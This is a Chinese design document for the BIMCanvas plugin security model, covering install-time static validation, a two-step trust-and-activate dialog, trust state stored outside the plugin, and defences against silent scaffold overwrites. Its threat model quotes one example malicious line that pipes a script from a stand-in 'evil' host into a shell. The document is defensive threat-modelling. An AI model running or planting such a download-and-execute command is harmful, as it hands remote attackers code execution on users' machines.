# Plugin Security Model

> BIMCanvas Plugin 安全模型说明。本文回答:**「为什么安装一个 plugin 不立刻执行它的代码?信任元数据为什么不放在 plugin 目录内?」**
>
> 配合 [plugin-lifecycle-states.md](./plugin-lifecycle-states.md)(状态机)+ [BYO-Plugin.md](./BYO-Plugin.md)(作者实务)阅读。
>
> 主真理源 v1.1 §3.12 / §3.13 / §6.1 R9 R10 / §8.2。

---

## 1. 一句话总结

**安装 ≠ 信任**。Plugin 安装(`git clone` + 静态校验)绝不执行任何 Python 代码;唯一的代码执行点是用户在 Web 端**主动**点 `[信任并激活]` 二次确认对话框后,服务器调用 `ExecutablePluginProbe` 做一次 dry-run。信任状态存在平台外的 `plugins-state.json`,plugin 代码不可触达。

---

## 2. 威胁模型:R9 安装阶段 RCE

### 2.1 攻击场景

- 攻击者制作一个看似无害的 plugin GitHub repo,内含 `mcp_tools/entry.py`
- `entry.py` 顶层(模块加载时即执行)写入恶意代码:`import os; os.system("curl evil.sh | sh")` / 加密本机文件 / 上传 SSH key
- 用户在某社区帖子看到推荐,在 BIMCanvas Web 端粘贴该 repo URL → 点 `[安装]`
- **如果平台在 install-time `importlib` 该 entry,RCE 立即发生**

### 2.2 防御:Static / Executable 严格分层

| Validator | 触发时机 | 执行 Python 代码? | 检查项 |
|---|---|---|---|
| **`StaticPluginValidator`** | `POST /api/plugins/install` 内自动调 | **绝对不** | (a) JSONSchema 校验 `bimcanvas-plugin.json` 全部字段<br>(b) 目录纯净检查(无 `CLAUDE.md` / `settings.local.json` / `.claude/`)<br>(c) `mcpTools` 路径不能含 `..` 逃逸 plugin root(纯字符串规范化)<br>(d) `mcpNamespace` 唯一性 + 非 `canvas` + 格式合法<br>(e) `overrides.{agents,skills}` 显式声明合法性 |
| **`ExecutablePluginProbe`** | `POST /api/plugins/{id}/trust-and-activate` 内调 | ✅ 一次 dry-run | (a) `importlib.util.spec_from_file_location` 实际 import `mcp_tools/<entry>.py`<br>(b) 调 `register(_FakeBuilder)` 做 dry-run,要求不抛异常<br>(c) 收集注册的工具名,确认不与 core-base 冲突 |

**关键纪律**:`StaticPluginValidator` 实现里**不允许**任何 `import / exec / eval / subprocess` 触达 plugin 内文件;不允许解析 Python AST(AST 解析可被构造为代码执行向量)。任何 staticValidator 内的 import 等同于 R9 漏洞。

### 2.3 用户感知防线

`ExecutablePluginProbe` 不是"自动安全"的银弹 —— probe 通过的 plugin 仍然有完全的代码执行能力(Phase 1 不做沙箱)。因此**用户必须明确感知"激活 = 信任执行代码"**:

- 首次激活按钮文案 **强制为 `[信任并激活]`**(不是 `[激活]` / `[启用]` / `[开启]`)
- 按下后弹 `TrustAndActivateDialog` 二次确认对话框,展示:
  - Plugin ID
  - `sourceUrl`(从哪个 GitHub repo clone 的)
  - `resolvedCommit`(被 pin 的 commit hash,作者后续 push 不影响已 trusted 的)
  - 黄色警告条:**「激活将执行该插件 `<plugin-id>` 的 Python 代码。请确认你信任来源 `<sourceUrl>`。」**
- 两按钮:`[确认信任并激活]` / `[取消]`

这是 R9 防御的**最后一道感知防线**,目的是让用户在按下按钮前,清楚知道自己在做什么。详见 [plugin-lifecycle-states.md](./plugin-lifecycle-states.md) §6。

---

## 3. ExecutablePluginProbe 的内部细节

probe 用 `_FakeBuilder` 而非真实 `McpServerBuilder`(主真理源 §3.12),原因:

- C# Server 子进程不引入 Python SDK 依赖
- probe 阶段不需要真实 `claude_agent_sdk.tool` 装饰器逻辑
- 只需验证 `register(builder)` 函数存在 + 不抛异常 + 收集工具名

**Plugin 作者的必读约束**:

1. `register` 函数体内**严禁** `isinstance(builder, McpServerBuilder)` 之类的类型断言 —— probe 传入的是 fake,会失败
2. `register` 函数体内**严禁**访问 `builder.context` 任何字段做条件注册 —— probe 传入最小占位 context(空字符串 / None / `session=None`),条件分支会走错

详见 [BYO-Plugin.md](./BYO-Plugin.md) 第 4 节"Plugin 作者必读 — register 函数体内两条硬约束"。

---

## 4. 信任元数据为什么必须存平台外

主真理源 §8.2 主持人决策(否决了"trust 元数据存 plugin 内 `.bimcanvas/install.json`"的早期建议):

> 任何从 GitHub clone 的 plugin 都可自带伪 `.bimcanvas/install.json` 声称"已 trusted",造成 trust 验证绕过;trust 状态必须存平台外、plugin 不可触达的位置。

### 4.1 正确位置:`BIMCANVAS_HOME/plugins-state.json`

```json
{
  "indoor-layout": {
    "trustState": "trusted",
    "installedAt": "2026-05-16T19:20:00+08:00",
    "trustedAt": "2026-05-16T19:30:00+08:00",
    "sourceUrl": "https://github.com/vibedrafting/BIMCanvas-IndoorLayout",
    "resolvedCommit": "a1b2c3d4e5f6...",
    "sourceKind": "github",
    "manifestChecksum": "sha256:...",
    "installedVersion": "1.0.0"
  },
  "electrical-points": {
    "trustState": "untrusted",
    "installedAt": "2026-05-16T21:00:00+08:00",
    ...
  }
}
```

- `BIMCANVAS_HOME` 是平台运行时根目录(默认 Windows `%USERPROFILE%\Documents\BIMCanvas\` / Linux `~/.bimcanvas/`)
- `plugins/` 是 plugin 目录(被 `git clone` 写入)
- `plugins-state.json` 与 `plugins/` **同级、但不在 `plugins/` 内**

### 4.2 唯一写入入口:`PluginTrustService`

- C# Server 端 `PluginTrustService` 是唯一允许 mutate 该文件的 Service
- 内部用单写锁 + 原子替换(临时文件 + rename)保证并发安全
- Plugin Python 代码完全无法触达该文件路径:`mcp_tools/entry.py` 拿到的 `PluginContext.project_path` 只指向 .bcp 项目,不指向 `BIMCANVAS_HOME`

### 4.3 plugin 内不能放伪造文件

主真理源 §6.2 v1.1 新增段:

> plugin 目录内**也不能放任何尝试伪造 trust 状态的文件**(如 `.bimcanvas/install.json` 等)—— 平台只信任 `BIMCANVAS_HOME/plugins-state.json`,plugin 内任何同名文件会被忽略。

`StaticPluginValidator` 的目录纯净检查(规则 b)虽然主要针对 `CLAUDE.md` / `.claude/`,但精神是一致的:plugin 不应携带任何"配置/状态"文件,只携带"代码 + 数据资源"。

---

## 5. R10 静默覆盖防御(legacy 项目保护)

### 5.1 攻击场景(无意而非恶意)

- 用户激活 plugin A → 创建 .bcp 项目甲 → 关闭程序
- 用户后续装 plugin B → 设为 active → 重启
- 用户**重新打开**项目甲 → 如果平台在 open-time 自动执行 plugin B 的 `projectMount` 物化,**plugin B 的脚手架会覆盖项目甲内 plugin A 的 references / modules**
- 这是 v1.0 设计的实际漏洞

### 5.2 防御:`MountSceneScaffold` 改为 bind-time 唯一入口

主真理源 §4.2 v1.1 修订:

> `ProjectFixedFilesBootstrapService` **不再在项目打开时自动调用**;改为只在 `bind scene` 动作触发时,调用 `MountSceneScaffold(sceneId, pluginId)` 把指定 plugin 的 projectMount 物化到 sceneId 命名空间。

具体实现(见 `BIMCanvas.Server/Controllers/ProjectController.cs` `BindScene` 端点):

- **`POST /api/project/{id}/scenes`** 是 `MountSceneScaffold` 的**唯一**调用点
- open project 时只读 `project.json.scenes[]` 做匹配,不写,不物化
- 即使 plugin 没匹配到任何 scene,Server 也只是返回 `openStatus: requires_scene_binding` 让 Web 弹对话框,**不自动 mount**

### 5.3 用户感知:三态对话框

打开 legacy / 未匹配项目时,Web 收到 `openStatus: requires_scene_binding` + `existingScenes` + `currentActivePlugin`,弹 `SceneBindingDialog`:

> 「此项目已有 [家具布置(`interior-layout-1`)] 场景,您当前激活 [精装点位(`electrical-points`)]。是否在此项目新增点位设计场景?」
>
> `[新增 electrical-points-1 场景]` `[取消并切回 indoor-layout]`

用户明确选 `[新增]` → 才调 `POST /api/project/{id}/scenes` → 才触发 `MountSceneScaffold`。

---

## 6. 进程内 plugin 与 Phase 1 信任边界

Phase 1 **不做** plugin 沙箱(没有 `multiprocessing.Process` / `subprocess` 隔离 / 容器 / WASM)。所有 plugin 代码与 Agent 在同一 Python 进程内执行,**完全信任**。

| Phase 1 信任假设 | 触发条件 / Phase 2+ 缓解 |
|---|---|
| Plugin 代码可读写本机磁盘任意路径(限于进程权限) | 类比 VS Code extension。社区反馈安全事故 → 引入 capability-based sandbox |
| Plugin 可发起任意网络请求 | 同上 |
| 单 plugin 高 CPU / 死循环 → Agent 进程卡死 | 单 active plugin 假设下不是大问题;多 plugin 共存阶段引入 timeout |
| plugin 间隔离 | Phase 1 同时只 active 一个 plugin,不存在 plugin 间互相调用 |

**Plugin 作者义务**(详见 [BYO-Plugin.md](./BYO-Plugin.md) §3 目录纯净纪律):

- 不在 `register()` 函数体顶层做副作用(网络请求 / 文件 I/O / 全局状态修改)
- 副作用必须在工具 `handler` 内进行(运行时,且有 `PluginContext.session` 等正确资源)
- 不读取 `BIMCANVAS_HOME` 或任何超出 `PluginContext.project_path` 范围的路径

---

## 7. 完整防御层级

```text
用户输入 GitHub URL
   │
   ▼
[1] git clone --depth 1 → 隔离 staging 目录
   │
   ▼
[2] StaticPluginValidator (纯文本, 5 条规则)
   │   ❌ 失败 → 删除 staging, 返回 schema_validation_failed
   ▼
[3] 原子 move staging → BIMCANVAS_HOME/plugins/<id>/
   │
   ▼
[4] plugins-state.json: trustState = "untrusted"
   │   ← 此时 plugin 仍未被执行过
   ▼
[5] UI 显示 [信任并激活] 按钮 (R9 感知防线 1)
   │
   ▼
[6] TrustAndActivateDialog 二次确认 (R9 感知防线 2)
   │   显示 sourceUrl + resolvedCommit + 警告
   ▼
[7] ExecutablePluginProbe dry-run (使用 _FakeBuilder)
   │   ❌ 失败 → trustState 保持 untrusted, 返回 plugin_probe_failed
   ▼
[8] plugins-state.json: trustState = "trusted" + trustedAt
   │
   ▼
[9] server_config.json.agent.activePlugin = <id>
   │
   ▼
[10] 用户重启 → Agent 正式 import + register(真实 builder)
   │
   ▼
[11] Server gate 按 ActiveSceneId 限制写入路径 (V12a / V12b)
   │
   ▼
[12] R10 缓解:MountSceneScaffold 仅在 bind-time 触发, 不在 open-time
```

每一层失败都不会向下传递。这是 Phase 1 安全模型的全部 —— 没有秘密。

---

## 8. 报告安全问题

发现疑似 BIMCanvas Phase 1 安全模型漏洞,请通过(以下渠道在公开开源后启用,Phase 1 阶段直接在私有仓库 Issues 标 `security` label 即可):

- GitHub Security Advisories(开源后)
- `SECURITY.md` 中声明的私密邮箱(开源后补)

请**不要**在公开 Issues 中描述 PoC。

---

**End of Plugin Security Model.**
